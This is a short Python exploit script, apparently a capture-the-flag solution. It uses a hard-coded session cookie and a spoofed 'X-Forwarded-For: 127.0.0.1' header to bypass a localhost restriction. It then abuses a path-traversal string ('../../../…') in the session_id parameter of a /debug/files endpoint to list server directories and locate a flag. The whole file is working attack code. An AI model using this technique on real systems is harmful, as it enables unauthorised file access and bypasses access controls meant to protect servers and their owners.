import requests

cookies = {
    "connect.sid": "s%3AamwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE"
}

headers = {
    "X-Forwarded-For": "127.0.0.1"
}

url = input("url: ")
dir = "../../../../../../../"

res1 = requests.get(url + "/debug/files", params={"session_id": dir}, cookies=cookies, headers=headers)

print(res1.text)

dir += input("flag dir: ") + "/"

print(f"{url}/debug/files?session_id={dir}")
